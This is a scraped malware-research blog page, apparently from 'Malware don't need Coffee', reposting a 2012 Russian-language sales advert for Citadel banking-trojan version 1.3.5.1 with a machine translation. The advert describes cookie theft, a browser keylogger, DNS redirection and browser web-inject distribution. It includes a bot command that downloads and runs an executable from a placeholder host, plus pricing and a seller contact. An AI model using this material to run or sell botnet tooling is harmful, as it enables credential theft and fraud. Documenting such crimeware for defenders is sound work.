&quot;HttpVipUrls&quot; в WebFilters, которая позволяет добавлять ссылки-исключения(http://) при отсутствии HTTP-граббинга (disable_httpgrabber 1).&amp;nbsp;[+] Полностью перереботан мануал, теперь удобная навигация + раскрыты некоторые тонкости работы, а также добавлены ответы на популярные вопросы, с примерами. Изменено лицензионное соглашение, которое содержится в мануале.Для получения новой версии, размещаем заявку в Jabber&#39;e в таком формате: &quot;&amp;lt;login в CRM&amp;gt; размещаю заявку на получение новой версии&quot;. Оплата поддержки должна быть своевременной, те, у кого задолжность более 3 месяцев - новую версию&amp;nbsp;не&amp;nbsp;получают. Срок выдачи от 3 до 72 часов. Если у вас имеется лицензированный партнер или саппорт, сразу пишите об этом в заявке до выдачи, а не после.Для старых клиентов, обновление включено в абонентскую плату, для новых, цена базовой комплектации составляет теперь&amp;nbsp;$3931.00Jabber для покупки и обновлений:&amp;nbsp;aquabox@lugmen.org.arСаппорт в праве отказать в продаже лицензии без объяснения причины. Поддержка клиентов на уровне сложных технических вопросов отменена из-за большого количества, обменивайтесь опытом с коллегами через CRM либо форумы.---------------------------------- Google Translation :&amp;nbsp;(Pastebin) - (if you want to correct this raw&amp;nbsp;google translation, drop a comment or DM on Twitter&amp;nbsp;)The latest tools and tools for professional work collected for you in the new version.Fixed problems with otstuk and vitality, work has become more pleasant, considered the most important requirements.Taken into account the whole experience last season, beginners will be much easier to work with the new version than the previous ones.Is now open for free access WebInjects new technology to the public.[+] Did a quick check of bots on Online-status on the main list of page.[+] Ability to add bot in the &quot;Favorites&quot; without reporting.[+] Made detection system privileges (admin / user), is displayed in the &quot;Information on bot [flags]&quot;[+] Sort by date screenshots.[+] Added ability to connect to other databases Citadel (as remote database, and old / disabled admin) to search for reports.[+] Expand your search in the database: you can specify the stop words, such as twitter.com, which will not appear in the issuance of the results, not to litter logging debris. Also, you can specify the contents of the search does not report, and for URL Mask, it increases the speed of data retrieval.[+] Enhanced Jabber notifier added Next event:- Masks BotID the event &quot;Boat reached the Online&quot;- Be notified when a specific software from the &quot;installed software&quot;- Mask to the contents of the report CMD.- Parallel convenient entry in the log-file of all events, in addition to Jabber-notifications.[+] Added a free module of grabbing cookies in Firefox, exports all the cookies from the browser and sends you.[+] Fixed delete reports.[+] Auto-Update Statistics homepage.[+] Button [Decode] on the reports, which can decode urlencode (% 0D) sequences in a convenient form.[+] Added the ability to determine the online / offline status of the bot in the API.[+] Completely reworked the algorithm checks the module WebSocks.[+] Show scripts (commands) by page.[+] Added ability to send messages to a jabber api.php (uses your personal settings in the admin)[+] Now, every HTTP / HTTPS report added cookies (Firefox / IE), as well as headlines:[+] Completely redesigned internal encryption algorithm otstuk many times higher, longer survival. You need to migrate to the new version, run the command user_execute http://www.host.com/1351.exe. RC4 key must match.[+] Adjust Browser Keylogger&#39;a. Automatically adds a space if after the last key press was 5 seconds, you need to visually separate input-fields.[+] Fixed an issue with a 302 redirect, did not work when inject, if you are following a link via javascript.[+] Plaintext logs will open in a new tab.[+] Fixed bots failure of the online when the GeoIP.[+] Display the comment to the boat in the VNC-module by the mouse, as well as sending a comment to jabber with information about a connection.[+] Ability to specify DnsFilters (redirect traffic) mask with an asterisk (*), you can make the mask more flexible.[+] WebInjects. The module is designed for easy interaction with Holder through technology injected into browsers. The module allows any progruzit inject specific BotID, country or botnet in just a few minutes, without having to edit the config. The module works through the admin panel.Brief educational program:In config bot section DynamicConfig, fit parameter url_webinjects &quot;http://www.host.com/file.php&quot; (path to file.php). Boat pulls the file every 2 minutes, taking out a packet injector, which gives the distribution of the system of granting the injector.From there VebInzhekty 2 sections: &quot;The group vebinzhektov&quot; and &quot;Paki&quot;, the first is the structure of &quot;group - injected - Members (admitted to the group),&quot; and is responsible for managing all of the injector. The second section is responsible for setting the spread of the injector (which deliver bots inject and how much).In the main menu, vrazdele &quot;Users&quot;, creating a new user has rights &quot;r_botnet_webinjects_coder&quot; is a user who can manage the group, which will appoint an administrator privileges. In other words, if you make a developer injected in admin account and create it, it will have the right to form their own injector and edit them, others injected he sees only displays a list of his own group injected. Ie you can create 5 groups and create a 5-coders inject, so each person is responsible for their group (set injector). You see the statistics of what happens in the overall system and can unites all groups injected into one &quot;pack&quot;, which will be progruzhen any and all bots, or a single category of boats in the class: a country or a botnet.In the admin area, a special convenient visual editor injected with syntax highlighting. Format is fully compatible with zevsoformatom.Image do several modes for packs.Dual - when running a file with injected from the main config + vebinzhekty.Single - when only vebinzhekty, and the local file with the injector is switched off.Disabled - when vebinzhekty disabled, and local file with injector works.If you accidentally make a mistake somewhere in the injector, the vebinzhekty be gathered together and you have to DEBUG-report with information which pack (bundle) was not assembled.The information on the boat, you can see the history of injection test web injected, also, you can search DEBUG-bot reports and look at the history and compilation errors vebinzhektov.If the bot receives several packs (bundles) where different modes of operation: dual, single, disabled then all Bandlov automatically selected the most &quot;narrow mode&quot;, such as single.Boat constantly checks for updates of any vebinzhektov, and if so, then it updates its host.[+] Option in the config disable_httpgrabber expanded and allows to get rid of HTTP-reports sent to the server HTTPS-only reports on all browsers, if set to &quot;1&quot;. Get rid of the extra load on the server.[+] Added the section &quot;HttpVipUrls&quot; in WebFilters, which allows you to add links-exclusion (http://) in the absence of HTTP-grabbing (disable_httpgrabber 1).[+] Fully pererebotan manual now easy navigation + revealed some details of the work, and also added the answers to frequently asked questions, with examples. Changed the license agreement, which is contained in the manual.To get the new version, place a request in Jabber&#39;e in this format: &quot;&amp;lt;login CRM&amp;gt; in place an application for a new version.&quot; Payment of support must be timely, those with debts of more than 3 months - do not get the new version. Term delivery from 3 to 72 hours. If you have a licensed partner or a support, just write it in the application to the issue, and not after.For existing customers, the update is included in the monthly fee for the new price of the basic configuration is now $ 3931.00Jabber for purchases and upgrades: aquabox@lugmen.org.arA support of the right to refuse the sale of a license without giving a reason. Customer support at the level of the complex technical issues canceled due to the number, share experience with colleagues through CRM or forums.---------------------------------- Looking for a sample &amp;nbsp;?91b64502a89d6c47d1adbde3ebbf2532&amp;nbsp;Want to read more ?Inside Citadel 1.3.4.5 C&amp;amp;C &amp;amp; Builder - Botnet Control Panel&amp;nbsp;- 2012-07-29Update to Citadel : v.1.3.4.5&amp;nbsp;- 2012-06-11Update to Citadel : v1.3.3.5&amp;nbsp;- 2012-04-03">
+	
+	
+
+	<link type="text/plain" rel="author" href="http://malware2.dontneedcoffee.com/humans.txt">
+
+	
+
+	
+
+	<link rel="icon" sizes="32x32" href="http://malware2.dontneedcoffee.com/assets/img/favicon-32x32.png">
+
+	<link rel="icon" sizes="192x192" href="http://malware2.dontneedcoffee.com/assets/img/touch-icon-192x192.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="180x180" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-180x180-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="152x152" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-152x152-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-144x144-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="120x120" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-120x120-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-114x114-precomposed.png">
+
+	
+	<link rel="apple-touch-icon-precomposed" sizes="76x76" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-76x76-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-72x72-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-precomposed.png">	
+
+	<meta name="msapplication-TileImage" content="http://malware2.dontneedcoffee.com/assets/img/msapplication_tileimage.png">
+
+	<meta name="msapplication-TileColor" content="#fabb00">
+
+
+	
+
+</head>
+<body id="top-of-page" class="post">
+	
+	<div id="navigation" class="sticky">
+  <nav class="top-bar" role="navigation" data-topbar>
+    <ul class="title-area">
+      <li class="name">
+      <h1 class="show-for-small-only"><a href="http://malware2.dontneedcoffee.com" class="icon-tree"> MDNC | Malware don't need Coffee</a></h1>
+    </li>
+       <!-- Remove the class "menu-icon" to get rid of menu icon. Take out "Menu" to just have icon alone -->
+      <li class="toggle-topbar menu-icon"><a href="#"><span>Navigation</span></a></li>
+    </ul>
+    <section class="top-bar-section">
+
+      <ul class="right">
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware2.dontneedcoffee.com/search/">Search</a></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware2.dontneedcoffee.com/contact/">Contact</a></li>
+
+            
+            
+          
+        
+        
+      </ul>
+
+      <ul class="left">
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware2.dontneedcoffee.com/">Home</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+
+              <li class="has-dropdown">
+                <a href="http://malware2.dontneedcoffee.com/blog/">Blog</a>
+
+                  <ul class="dropdown">
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/blog/external/">External Blog</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/blog/archive/">Blog Archive</a></li>
+                    
+                  </ul>
+
+              </li>
+              <li class="divider"></li>
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware2.dontneedcoffee.com/faq/">FAQ</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+
+              <li class="has-dropdown">
+                <a href="http://malware2.dontneedcoffee.com/headers/">Header Styles</a>
+
+                  <ul class="dropdown">
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-full-width-image/">Header with Full-Width-Image</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-image-pattern/">Header with Image and Pattern</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-image-color/">Header with image and color</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-logo-only/">Header Only With Logo</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-with-text/">Header With Text</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/no-header/">No Header</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/no-header-but-image/">No Header but Image</a></li>
+                    
+                  </ul>
+
+              </li>
+              <li class="divider"></li>
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+
+              <li class="has-dropdown">
+                <a href="http://malware2.dontneedcoffee.com/documentation/">Documentation</a>
+
+                  <ul class="dropdown">
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/changelog/">Changelog</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/roadmap/">Roadmap</a></li>
+                    
+                  </ul>
+
+              </li>
+              <li class="divider"></li>
+            
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+        
+      </ul>
+    </section>
+  </nav>
+</div><!-- /#navigation -->
+
+	
+
+	
+
+<div id="masthead-no-image-header">
+	<div class="row">
+		<div class="small-12 columns">
+			<a id="logo" href="http://malware2.dontneedcoffee.com" title="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+				<img src="http://malware2.dontneedcoffee.com/assets/img/logo.png" alt="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+			</a>
+		</div><!-- /.small-12.columns -->
+	</div><!-- /.row -->
+</div><!-- /#masthead -->
+
+
+
+
+
+
+
+
+	<div class="row t30">
+	<div class="medium-8 columns medium-offset-2 end">
+		<article itemscope itemtype="http://schema.org/Article">
+			<header>
+				
+
+				<div itemprop="name">
+					
+					<h1>Update to Citadel : 1.3.5.1 Rain Edition.</h1>
+				</div>
+			</header>
+
+
+			
+
+			<div itemprop="articleSection">
+			<div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-xMxQbH2TavM/UGzcAVC4ynI/AAAAAAAABaU/RlmTdBNoZG4/s1600/screenshot_401.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-xMxQbH2TavM/UGzcAVC4ynI/AAAAAAAABaU/RlmTdBNoZG4/s1600/screenshot_401.png" /></a></div><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue Light', HelveticaNeue-Light, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 19px;"><br /></span><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue Light', HelveticaNeue-Light, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 19px;">A new version of Citadel has been announced :&nbsp;</span><span style="color: #333333; font-family: Helvetica Neue Light, HelveticaNeue-Light, Helvetica Neue, Helvetica, Arial, sans-serif;"><span style="font-size: 14px; line-height: 19px;">1.3.5.1 Rain Edition.</span></span><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-IV1F7dhsDN8/UGzZFz2XgbI/AAAAAAAABZQ/CoWNgzZ-_cg/s1600/screenshot_400.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="586" src="http://1.bp.blogspot.com/-IV1F7dhsDN8/UGzZFz2XgbI/AAAAAAAABZQ/CoWNgzZ-_cg/s640/screenshot_400.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Aquabox post</td></tr></tbody></table><span style="color: #333333; font-family: Helvetica Neue Light, HelveticaNeue-Light, Helvetica Neue, Helvetica, Arial, sans-serif;"><span style="font-size: 14px; line-height: 19px;"><br /></span></span><u style="background-color: white; color: #333333; font-family: 'Helvetica Neue Light', HelveticaNeue-Light, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 19px; text-align: justify;">Original text of the advert :</u>&nbsp;(<a href="http://pastebin.com/zmc7ypBJ">Pastebin</a>)<br /><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-s-cPkJWsMzE/UGzZej0SbZI/AAAAAAAABZY/87z_Y2Jo_y8/s1600/fd497e5b4853.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-s-cPkJWsMzE/UGzZej0SbZI/AAAAAAAABZY/87z_Y2Jo_y8/s1600/fd497e5b4853.png" /></a></div><br /><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;"><br /></span><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;"><br /></span><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;"><br /></span><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;"><br /></span><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;"><br /></span><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;"><br /></span><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Самые современные средства и инструменты для профессиональной работы собраны специально для вас в новой версии.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Решены проблемы с отстуком и живучестью, работа стала еще приятнее, учтены самые важные пожелания.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Взят во внимание весь опыт работы за последний сезон, новичкам будет гораздо проще работать с новой версией, чем с предыдущими.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Теперь открыта в свободном доступе новая технология WebInjects для всех желающих.</span><br /><br style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;" /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Сделана быстрая проверка ботов на Online-статус, списком на главной странцие.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Возможность добавить бота в "Избранное" без отчетов.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Сделано детектирование привилегий в системе(admin/user), отображается в "Информация о боте: [Флаги]"</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Сортировка скриншотов по дате.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Добавлена возможность подключения других БД Citadel (как удаленные БД, так и старые/отключенные админки) для поиска отчетов.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Расширен поиск в БД: можно указывать стоп-слова, например twitter.com, которые будут отсутствовать при выдаче результатов, чтобы не засорять логи мусором. Также, можно указать поиск не по содержимому отчета, а по URL Mask, это увеличивает скорость поиска данных.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Расширен Jabber уведомитель, добавлены следущие события:</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">- Маски BotID на событие "Бот вышел в Online"</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">- Уведомление при обнаружении конкретного ПО из "installed software"</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">- Маска на содержимое CMD отчета.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">- Параллельная удобная запись в log-файл всех событий, помимо Jabber-уведомлений.</span><br /><b style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Добавлен бесплатный модуль граббинга кукисов в Firefox, экспортирует все cookies из браузера и отсылает вам.</b><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Исправлена ошибка удаления отчетов.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Авто-обновление статистики главной страницы.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Кнопка [Decode] на отчетах, которая позволяет декодировать urlencode(%0D) последовательности в удобный вид.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Добавлена возможность определения online/offline статуса у бота в API.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Полностью переделан алгоритм проверки в модуле WebSocks.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Отображение скриптов(команд) постранично.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Добавлена возможность отсылки сообщений на jabber через api.php (использует ваши персональные настройки в админке)</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Теперь при каждом HTTP/HTTPS отчете, добавляются cookies(Firefox/IE), а также заголовки:&nbsp;</span><br /><b style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Полностью переделан внутренний алгоритм шифрования, отстук во много раз выше, живучесть дольше. Для переноса ботов на новую версию, выполняем команду user_execute&nbsp;http://www.host.com/1351.exe. RC4 ключ должен совпадать.</b><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Корректировка Browser Keylogger'a. Автоматически добавляются пробел, если с момента последнего нажатия клавиши прошло 5 секунд, необходимо для визуального разделения input-полей.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Исправлен недочет с 302 редиректом, когда не срабатывал инжект, если осуществлялся переход по ссылке через javascript.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Plaintext логи открываются в новой вкладке.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Исправлена ошибка пропадания ботов из онлайна при включенном GeoIP.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Отображение комментария к боту в VNC-модуле при наведении мышки, а также отсылка комментария в jabber вместе с информацией о коннекте.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] Возможность указать в DnsFilters(перенаправление траффика) маски со звездочками (*), можно сделать маску более гибкой.</span><br /><b style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">[+] WebInjects. Модуль разработан для быстрого взаимодействия с холдером через технологию инжектов в браузеры. Модуль позволяет прогрузить любые инжекты конкретному BotID, стране или ботнету всего лишь за несколько минут, без редактирования конфига. Модуль работает через админку.</b><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Краткий ликбез:</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">В конфиге бота, секция DynamicConfig, вписывается параметр url_webinjects "http://www.host.com/file.php" (путь до file.php). Бот дергает этот файл раз в 2 минуты, забирая оттуда пачку инжектов, которую выдает распределения система выдачи инжектов.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">В разделе ВебИнжекты существуют 2 секции: "Группа вебинжектов" и "Паки", первая имеет структуру "Группа - Инжекты - Пользователи(допущенные к группе)" и отвечает за управление всеми инжектами. Вторая секция отвечает за настройку распространения инжектов(каким ботам доставляем инжекты и в каком количестве).</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">В главном меню, вразделе "Пользователи", при создании нового пользователя, есть права "r_botnet_webinjects_coder" это пользователь, который может управлять группой, привилегии которого назначит администратор. Иначе говоря, если вы допустите разработчика инжектов в админку и создадите ему аккаунт, то у него будут права создавать свои инжекты и редактировать их, чужие инжекты он не видит, отображается только своя группа списка инжектов. Т.е вы можете создать 5 групп и создать 5 инжект-кодеров, таким образом каждый человек отвечает за свою группу(набор инжектов). Вы смотрите в статистике что происходит в общей системе и можете объеденять все группы инжектов в один "пак", который будет прогружен всем без исключения ботам, либо отдельно взятой категории ботов по классу: страна или ботнет.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">В админке создан специальный удобный визуальный редактор инжектов с подсветкой синтаксиса. Формат полностью совместим с зевсоформатом.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Сушествует несколько режимов для паков.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Dual - когда работает файл с инжектами из основного конфига + вебинжекты.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Single - когда работают только вебинжекты, а локальный файл с инжектами отключается.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Disabled - когда вебинжекты отключены, а локальный файл с инжектами работает.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 19px;">Если случайно была допущена ошибка где-то в инжекте, то вебинжекты не соберутся и вам придет DEBUG-отчет с информацией, какой пак(bundle) не был собран.</span><br /><span style="background-color: #f8f8f7; color: #5f5f5f; font-family: Verdana, Tahoma, Arial, 'Trebuchet MS', sans-serif, Georgia, Courier, 'Times New Roman', serif; font-size: 12px; line-height: 